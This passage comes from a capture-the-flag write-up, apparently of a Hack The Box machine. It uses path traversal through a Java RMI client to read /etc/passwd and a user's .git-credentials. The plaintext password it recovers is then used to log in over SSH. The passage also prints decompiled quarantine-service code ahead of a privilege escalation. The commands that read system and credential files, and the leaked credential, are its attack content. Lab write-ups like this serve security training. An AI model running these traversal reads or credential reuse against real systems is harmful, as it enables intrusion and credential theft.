</code></pre></div><p>Now we can start thinking on what to do next&mldr; The field <code>asdf</code> is appended to a file path&mldr; So, let&rsquo;s perform a Directory Traversal attack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java com.htb.hosting.rmi.Client view 1337 ../../etc/hosts
java com.htb.hosting.rmi.Client view 1337 ../../etc/hosts
127.0.0.1 localhost webhosting.htb registry.webhosting.htb registrytwo
127.0.1.1 rpc
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

bash-4.4$ java com.htb.hosting.rmi.Client view 1337 ../../etc/hostname
java com.htb.hosting.rmi.Client view 1337 ../../etc/hostname
registry

bash-4.4$ java com.htb.hosting.rmi.Client view 1337 ../../etc/passwd
java com.htb.hosting.rmi.Client view 1337 ../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
clamav:x:111:113::/var/lib/clamav:/bin/false
rmi-service:x:999:998::/home/rmi-service:/bin/false
developer:x:1001:1001:,,,:/home/developer:/bin/bash
_laurel:x:998:997::/var/log/laurel:/bin/false
</code></pre></div><p>Great, we have the ability to read files from the machine. Let&rsquo;s use <code>list</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java com.htb.hosting.rmi.Client list 1337 ../../
java com.htb.hosting.rmi.Client list 1337 ../../
..
initrd.img
opt
sbin
snap
root
var
proc
mnt
vmlinuz
vmlinuz.old
boot
tmp
initrd.img.old
cdrom
home
lib64
quarantine
run
dev
sys
etc
media
usr
srv
lib
sites
lost+found
bin
bash-4.4$ java com.htb.hosting.rmi.Client list 1337 ../../home
java com.htb.hosting.rmi.Client list 1337 ../../home
..
developer
bash-4.4$ java com.htb.hosting.rmi.Client list 1337 ../../home/developer  
java com.htb.hosting.rmi.Client list 1337 ../../home/developer
..
.cache
.bash_logout
reg.jar
.bashrc
.bash_history
.git-credentials
user.txt
start.sh
.gnupg
.profile
.vimrc
.local
</code></pre></div><p>Great, we have some files from user <code>developer</code>, the one named <code>.git-credentials</code> might store some plaintext passwords:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java com.htb.hosting.rmi.Client view 1337 ../../home/developer/.git-credentials  
&lt;ent view 1337 ../../home/developer/.git-credentials
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
</code></pre></div><p>There it is! And this password works in SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> developer@10.10.11.223
developer@10.10.11.223's password:  
<span class="code-green">developer@registry</span>:<span class="code-blue">~</span>$ cat user.txt
371e1bc3c1d3673c70164fe27e7bdce0
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>If we search for JAR files, we will see two that are relevant:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@registry</span>:<span class="code-blue">~</span>$ find / -name \*.jar 2&gt;/dev/null  
/opt/registry.jar
/usr/share/ca-certificates-java/ca-certificates-java.jar
/usr/share/vhost-manage/includes/quarantine.jar
/usr/share/apport/testsuite/crash.jar
/usr/share/apport/apport.jar
/usr/share/java/java-atk-wrapper.jar
/usr/share/java/libintl.jar
/usr/lib/jvm/java-17-openjdk-amd64/lib/jrt-fs.jar
/usr/lib/jvm/java-11-openjdk-amd64/lib/jrt-fs.jar
</code></pre></div><ul><li><code>registry.jar</code> is the RMI service (<code>FileService</code> and <code>QuarantineService</code>)</li><li><code>quarantine.jar</code> is an RMI client that connects to <code>registry.jar</code> and sets up ClamAV</li></ul><p>We can download them and decompile them in <a target="_blank" href="http://www.javadecompilers.com">javadecompilers.com</a>, as before.</p><p>The <code>QuarantineService</code> registry only exposes one method called <code>getConfiguration</code>, which is actually very simple:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">quarantine</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">FileServiceConstants</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">quarantine</span><span class="mtk5">.</span><span class="mtk8 mtku">QuarantineConfiguration</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">quarantine</span><span class="mtk5">.</span><span class="mtk8 mtku">QuarantineService</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">File</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">logging</span><span class="mtk5">.</span><span class="mtk8 mtku">Logger</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineServiceImpl</span>
<span class="mtk5">implements</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineService</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">Logger</span><span class="mtk1"> </span><span class="mtk1">logger</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> Logger.</span><span class="mtk8">getLogger</span><span class="mtk1">(</span><span class="mtk8 mtku">QuarantineServiceImpl</span><span class="mtk1">.</span><span class="mtk5">class</span><span class="mtk1">.</span><span class="mtk8">getSimpleName</span><span class="mtk1">());</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineConfiguration</span><span class="mtk1"> </span><span class="mtk1">DEFAULT_CONFIG</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">QuarantineConfiguration</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk4">"/root/quarantine"</span><span class="mtk1">), </span><span class="mtk8 mtku">FileServiceConstants</span><span class="mtk1">.</span><span class="mtk1">SITES_DIRECTORY</span><span class="mtk1">, </span><span class="mtk4">"localhost"</span><span class="mtk1">, </span><span class="mtk6">3310</span><span class="mtk1">, </span><span class="mtk6">1000</span><span class="mtk1">);</span>  

<span class="mtk1">    @</span><span class="mtk8 mtku">Override</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineConfiguration</span><span class="mtk1"> </span><span class="mtk8">getConfiguration</span><span class="mtk1">() </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk1">logger</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk4">"client fetching configuration"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">DEFAULT_CONFIG</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The <code>quarantine.jar</code> contains this <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">Client</span><span class="mtk1">;</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Main</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1">[] </span><span class="mtk9 mtki">args</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">Client</span><span class="mtk1">().</span><span class="mtk8">scan</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Throwable</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">1024</span><span class="mtk1">, </span><span class="mtk4">"an unknown error occurred"</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Object</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]);</span>  
<span class="mtk1">            </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">printStackTrace</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Where <code>new Client().scan</code> does the following:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// ...</span>

<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Client</span>
<span class="mtk5">implements</span><span class="mtk1"> </span><span class="mtk8 mtku">LogConstants</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">ClamScan</span><span class="mtk1"> </span><span class="mtk1">clamScan</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk8 mtku">QuarantineConfiguration</span><span class="mtk1"> </span><span class="mtk1">config</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk8">Client</span><span class="mtk1">() </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">RemoteException</span><span class="mtk1">, </span><span class="mtk8 mtku">NotBoundException</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Registry</span><span class="mtk1"> </span><span class="mtk1">registry</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> LocateRegistry.</span><span class="mtk8">getRegistry</span><span class="mtk1">(</span><span class="mtk4">"localhost"</span><span class="mtk1">, </span><span class="mtk6">9002</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8 mtku">QuarantineService</span><span class="mtk1"> </span><span class="mtk1">server</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">QuarantineService</span><span class="mtk1">)</span><span class="mtk1">registry</span><span class="mtk1">.</span><span class="mtk8">lookup</span><span class="mtk1">(</span><span class="mtk4">"QuarantineService"</span><span class="mtk1">);</span>  
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">server</span><span class="mtk1">.</span><span class="mtk8">getConfiguration</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">clamScan</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">ClamScan</span><span class="mtk1">(</span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">scan</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">File</span><span class="mtk1">[] </span><span class="mtk1">documentRoots</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1">.</span><span class="mtk8">getMonitorDirectory</span><span class="mtk1">().</span><span class="mtk8">listFiles</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">documentRoots</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">documentRoots</span><span class="mtk1">.length </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">, </span><span class="mtk4">"exiting"</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Object</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk4">"initialize scan for %d domains"</span><span class="mtk1">, </span><span class="mtk1">documentRoots</span><span class="mtk1">.length);</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">documentRoot</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk1">documentRoots</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">doScan</span><span class="mtk1">(</span><span class="mtk1">documentRoot</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
</code></pre></div><p>And <code>doScan</code> is another method that connects to ClamAV through a socket on port 3310 to send some commands:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">doScan</span><span class="mtk1">(</span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk9 mtki">file</span><span class="mtk1">) {</span>
<span class="mtk1">        block12</span><span class="mtk5">:</span><span class="mtk1"> {</span>
<span class="mtk1">            block11</span><span class="mtk5">:</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">isDirectory</span><span class="mtk1">()) </span><span class="mtk5">break</span><span class="mtk1"> block11;</span>
<span class="mtk1">                </span><span class="mtk8 mtku">File</span><span class="mtk1">[] </span><span class="mtk1">files</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">listFiles</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">files</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1"> block12;</span>
<span class="mtk1">                </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk1">files</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">doScan</span><span class="mtk1">(</span><span class="mtk1">f</span><span class="mtk1">);</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1"> block12;</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk8 mtku">Path</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">toPath</span><span class="mtk1">();</span>
<span class="mtk1">                </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1"> (Files.</span><span class="mtk8">isSymbolicLink</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">)) {</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">, </span><span class="mtk4">"skipping %s"</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">                        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">, </span><span class="mtk4">"unknown error occurred when processing %s</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">);</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">                }</span>
<span class="mtk1">                </span><span class="mtk8 mtku">ScanResult</span><span class="mtk1"> </span><span class="mtk1">scanResult</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">clamScan</span><span class="mtk1">.</span><span class="mtk8">scanPath</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">toAbsolutePath</span><span class="mtk1">().</span><span class="mtk8">toString</span><span class="mtk1">());</span>
<span class="mtk1">                </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk1">scanResult</span><span class="mtk1">.</span><span class="mtk8">getStatus</span><span class="mtk1">()) {</span>
<span class="mtk1">                    </span><span class="mtk5">case</span><span class="mtk1"> ERROR</span><span class="mtk5">:</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">768</span><span class="mtk1">, </span><span class="mtk4">"there was an error when checking %s"</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">                        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">case</span><span class="mtk1"> FAILED</span><span class="mtk5">:</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">32</span><span class="mtk1">, </span><span class="mtk4">"%s was identified as a potential risk. applying q</span><span class="mtk4">uarantine ..."</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>  
<span class="mtk1">                        </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">quarantine</span><span class="mtk1">(</span><span class="mtk9 mtki">file</span><span class="mtk1">);</span>
<span class="mtk1">                        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">case</span><span class="mtk1"> PASSED</span><span class="mtk5">:</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"%s status ok"</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                }</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">IOException</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">512</span><span class="mtk1">, </span><span class="mtk4">"io error processing %s"</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">            }</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">quarantine</span><span class="mtk1">(</span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk9 mtki">srcFile</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">destFolder</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk1">config</span><span class="mtk1">.</span><span class="mtk8">getQuarantineDirectory</span><span class="mtk1">(), </span><span class="mtk4">"quarantine-run-"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> LocalDateTime.</span><span class="mtk8">now</span><span class="mtk1">());</span>
<span class="mtk1">        </span><span class="mtk1">destFolder</span><span class="mtk1">.</span><span class="mtk8">mkdirs</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">File</span><span class="mtk1"> </span><span class="mtk1">dstFile</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">File</span><span class="mtk1">(</span><span class="mtk1">destFolder</span><span class="mtk1">, </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">getQuarantineFileName</span><span class="mtk1">(</span><span class="mtk9 mtki">srcFile</span><span class="mtk1">));</span>
<span class="mtk1">            Files.</span><span class="mtk8">copy</span><span class="mtk1">(</span><span class="mtk9 mtki">srcFile</span><span class="mtk1">.</span><span class="mtk8">toPath</span><span class="mtk1">(), </span><span class="mtk1">dstFile</span><span class="mtk1">.</span><span class="mtk8">toPath</span><span class="mtk1">(), LinkOption.NOFOLLOW_LINKS, StandardCopyOption.</span><span class="mtk1">REPLACE_EXISTING);</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk4">"%s was successfully scanned"</span><span class="mtk1">, </span><span class="mtk9 mtki">srcFile</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">IOException</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Client</span><span class="mtk1">.</span><span class="mtk8">out</span><span class="mtk1">(</span><span class="mtk6">512</span><span class="mtk1">, </span><span class="mtk4">"io error processing %s"</span><span class="mtk1">, </span><span class="mtk9 mtki">srcFile</span><span class="mtk1">.</span><span class="mtk8">getAbsolutePath</span><span class="mtk1">());</span>
<span class="mtk1">        }</span>
</code></pre></div><p>If the scanning result is <code>FAILED</code>, then the files are quarantined into a directory.</p><p>If we run <a target="_blank" href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a>, we will notice that <code>root</code> is executing the <code>quarantine.jar</code> file periodically, but also, a user named <code>rmi-service</code> is restarting the <code>registry.jar</code> file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=23959  | systemctl restart registry.service</span>
